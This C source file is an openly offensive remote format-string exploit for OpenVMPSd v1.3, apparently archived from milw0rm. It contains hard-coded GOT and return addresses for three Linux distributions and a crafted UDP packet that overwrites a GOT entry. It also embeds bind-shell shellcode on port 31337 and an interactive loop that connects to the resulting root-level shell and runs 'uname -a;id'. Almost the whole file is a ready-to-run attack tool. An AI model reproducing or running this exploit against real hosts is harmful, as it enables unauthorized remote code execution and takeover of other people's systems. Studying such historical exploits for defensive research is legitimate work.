/*
 * gexp-openvmpsd.c
 *
 * OpenVMPSd v1.3 Remote Format String Exploit
 * Copyright (C) 2005 Gotfault Security
 *
 * Bug found and developed by: barros and xgc
 *
 * Original Reference:
 * http://gotfault.net/research/exploit/gexp-openvmpsd.c
 *
 */

#include <getopt.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <errno.h>
#include <netinet/in.h>
#include <stdio.h>

/*==[ Prototypes ]==*/
void Usage(char *);
void fatal(char *);
int  CreateEvilBuffer(int, int, int, int, char *);
void ExecuteShell(int);
void SendBuffer(int , char *, int);
int  CreateUdpSocket(void);
int  ConectToHost(char *, int);

/*==[ Defines ]==*/
#define	DEFAULT_PORT		1589	// Default server port
#define BIND_PORT		31337	// Default port to bind
#define NOPSIZE			50	// Do not change this value cause the shellcode space is "limited"
#define NOP			0x90	// Nop value
#define PAD			"..."	// Format string alignment
#define PORT_OFFSET		29	// Offset to fix the shellcode

/*==[ Targets ]==*/
struct
{
	char	*Name;
	int	Gotaddr;
	int	Retaddr;
	int	Pop;
}Targets[] =
	{
		"OpenVMPSd v1.3 @ Slackware 10.0",
		0x0804e57c,
		0xbffff4f5,
		19,

		"OpenVMPSd v1.3 @ Debian 3.0 Linux",
                0x0804d0f8,
		0xbffff7ac,
		29,

		"OpenVMPSd v1.3 @ Fedora Core 2",
		0x0804d0f8,
		0xbffff7ac,
		19,

		// Finish
		0,
		0,
		0,
		0
	};

/*==[ Shellcode by Marco Ivaldi <raptor@0xdeadbeef.info> ]==*/
char shellcode[] =
        "\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
        "\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80"
        "\x89\xc7\x52\x66\x68"
        "BP" // Port to bind
        "\x43\x66\x53\x89\xe1\xb0\x10\x50\x51\x57\x89\xe1\xb0\x66\xcd\x80"
        "\xb0\x66\xb3\x04\xcd\x80"
        "\x50\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80"
        "\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80"
        "\x41\xe2\xf8\x51\x68n/sh\x68//bi\x89\xe3\x51\x53\x89\xe1\xb0\x0b\xcd\x80";

/*==[ OpenVMPSd UDP packet header ]==*/
#define SIZE_OF_HEADER 14
char header[] = "\x41\x01\x41\x01\x41\x41\x41\x41\x00\x00\x0c\x02";

int main(int argc, char **argv)
{
	extern  char		*optarg;
	extern  int		optind;
		char		opt;
		char		*Host = NULL;
		int		Port = DEFAULT_PORT;
		int		BindPort = BIND_PORT;
		int		TargetNumber = 0;
		int		Sock,i;
		char		*EvilBuffer;
		int		BufLen;

	fprintf(stdout,"\n--=[ OpenVMPSd Remote Format String Exploit ]\n\n");
	
	// Process arguments
	while ( (opt = getopt(argc,argv,"h:t:p:r:")) != EOF)
	{
		switch(opt)
		{
			case 'r':
				BindPort = atoi(optarg);
				if(!BindPort) Usage(argv[0]);
			break;
			case 'p':
				Port = atoi(optarg);
				if(!Port) Usage(argv[0]);
			break;
			case 't':
				TargetNumber = atoi(optarg);
			break;
			case 'h':
				Host = optarg;
			break;
			default: Usage(argv[0]);
			break;
		}
	}
	if(Host == NULL) Usage(argv[0]);

	// Verify target
	for(i=0;;i++)
		if(Targets[i].Name == 0) break;
	if(--i<TargetNumber) Usage(argv[0]);

	fprintf(stdout,"[*] Target plataform      : %s\n",Targets[TargetNumber].Name);
	fprintf(stdout,"[*] Target host           : %s\n",Host);
	fprintf(stdout,"[*] Target port           : %u\n",Port);
	fprintf(stdout,"[*] Bind to port          : %u\n",BindPort);
	fprintf(stdout,"[*] Target GOT            : %#010x\n",Targets[TargetNumber].Gotaddr);
	fprintf(stdout,"[*] Target Retaddr        : %#010x\n",Targets[TargetNumber].Retaddr);	
	fprintf(stdout,"[*] Target POP            : %d\n\n",Targets[TargetNumber].Pop);

	fprintf(stdout,"[*] Connecting\t\t  : ");
	fflush(stdout);
	Sock = ConectToHost(Host,Port);
	if(Sock == -1) fatal("Could not connect");
	else fprintf(stdout,"done\n");

	fprintf(stdout,"[*] Creating EvilBuffer\t  : ");
	fflush(stdout);
	EvilBuffer = (char *)malloc(strlen(shellcode)+NOPSIZE+strlen(PAD)+515);
	if(!EvilBuffer) fatal("Out of memory");
	BufLen = CreateEvilBuffer(Targets[TargetNumber].Gotaddr,Targets[TargetNumber].Retaddr,Targets[TargetNumber].Pop,BindPort,EvilBuffer);
	fprintf(stdout,"done\n");
	
	fprintf(stdout,"[*] Attacking\t\t  : ");
	fflush(stdout);
	SendBuffer(Sock,EvilBuffer,BufLen);
	fprintf(stdout,"done\n");

	close(Sock);

	sleep(1);

        Sock = ConectToShell(Host,BindPort);

        if(Sock == -1) {
		fprintf(stdout,"[*] Exploit Failed.\n\n");
		exit(0);
	}
        else {
		fprintf(stdout,"[*] Spawning Shell...\n\n");
		ExecuteShell(Sock);
	        close(Sock);
	}
}

void SendBuffer(int Sock, char *Buffer, int size)
{
	if(send(Sock,Buffer,size,0) == -1)
		fatal("SEND");
}

int ConectToHost(char *Host,int Port)
{
	struct 		sockaddr_in server;
	struct 		hostent *hp;
	int 		s;

	server.sin_family = AF_INET;
	hp = gethostbyname(Host);
	if(!hp) return(-1);

	memcpy(&server.sin_addr,hp->h_addr,hp->h_length);
	server.sin_port = htons(Port);

	s = socket(PF_INET,SOCK_DGRAM,0);
	if(connect(s,(struct sockaddr *)&server, sizeof(server)) < 0)
		return(-1);

	return(s);
}

int ConectToShell(char *Host,int Port)
{
        struct          sockaddr_in server;
        struct          hostent *hp;
        int             s;

        server.sin_family = AF_INET;
        hp = gethostbyname(Host);
        if(!hp) return(-1);

        memcpy(&server.sin_addr,hp->h_addr,hp->h_length);
        server.sin_port = htons(Port);

        s = socket(PF_INET,SOCK_STREAM,0);
        if(connect(s,(struct sockaddr *)&server, sizeof(server)) < 0)
                return(-1);

        return(s);
}

int CreateEvilBuffer(int GOT, int RETADDR, int POP, int BINDTOPORT, char *buffer)
{
	char		*nops = malloc(NOPSIZE+1);
	char		*ptr;
	unsigned short	*len;
	unsigned short	*portPtr = (unsigned short *)(shellcode+PORT_OFFSET);

	// Fix shellcode
	*portPtr = htons(BINDTOPORT);

	// Header
	ptr = buffer;
	memcpy(ptr,header,12);
	ptr += SIZE_OF_HEADER;
	len = (unsigned short *)(buffer + SIZE_OF_HEADER - 2);

	// Create Nops
	bzero(nops,NOPSIZE+1);
	memset(nops,NOP,NOPSIZE);
	
	// Create format string attack
	sprintf(ptr,
		PAD
		"%c%c%c%c"
                "%c%c%c%c"
                "%%.%dd"
                "%%%d$hn"
                "%%.%dd"
                "%%%d$hn"
                "%s%s",
                ((u_long)GOT),
                ((u_long)GOT >> 8),
                ((u_long)GOT >> 16),
                ((u_long)GOT >> 24),
                ((u_long)GOT+2),
                (((u_long)GOT+2) >> 8),
                (((u_long)GOT+2) >> 16),
                (((u_long)GOT+2) >> 24),
                ((RETADDR & 0x0000FFFF) - 9 - 63),
                POP,
                (((RETADDR & 0xFFFF0000)>>16) + 0x10000 - (RETADDR & 0x0000FFFF)) - 1,
                POP+1,nops,shellcode); 

	*len = htons(strlen(ptr));

	return (strlen(ptr)+14);
}

#define	STDIN			0
#define STDOUT			1
void ExecuteShell(int Sock)
{
	char 		buffer[1024 * 10];
	int 		count;
	fd_set 		readfs;

	write(Sock,"uname -a;id\n",12);
	while(1)
	{
		FD_ZERO(&readfs);
		FD_SET(STDIN, &readfs);
		FD_SET(Sock, &readfs);
		if(select(Sock + 1, &readfs, NULL, NULL, NULL) > 0)
		{
			if(FD_ISSET(STDIN, &readfs))
			{
				if((count = read(STDIN, buffer, 1024)) <= 0)
				{
					if(errno == EWOULDBLOCK || errno == EAGAIN)
						continue;
					else
					{
						close(Sock);
						exit(-1);
					}
				}
				write(Sock, buffer, count);
			}
			if(FD_ISSET(Sock, &readfs))
			{
				if((count = read(Sock, buffer, 1024)) <= 0)
				{
					if(errno == EWOULDBLOCK || errno == EAGAIN)
						continue;
					else
					{
						close(Sock);
						exit(-1);
					}
				}
				write(STDOUT, buffer, count);
			}
		}
	}
}

void fatal(char *ErrorMsg)
{
	fprintf(stderr,"ERROR - %s\n\n",ErrorMsg);
	exit(1);
}

void Usage(char *Prog)
{
	int i;
	fprintf(stderr,	"Usage: %s -h hostname <options>\n\n"
			"Options:\n\n"
			" -t target     : Select the target\n"
			" -p portnumber : Sets a new port number <default: %d>\n"
			" -r bindport   : Sets the port to bind a shell <default: %d>\n\n"
			"Targets:\n\n",Prog,DEFAULT_PORT,BIND_PORT);

	for(i=0;;i++)
	{
		if(Targets[i].Name != 0)
			fprintf(stderr," [%u] %s\n",i,Targets[i].Name);
		else
			break;
	}
	fprintf(stderr,"\n");
	exit(1);
}

// milw0rm.com [2006-02-10]
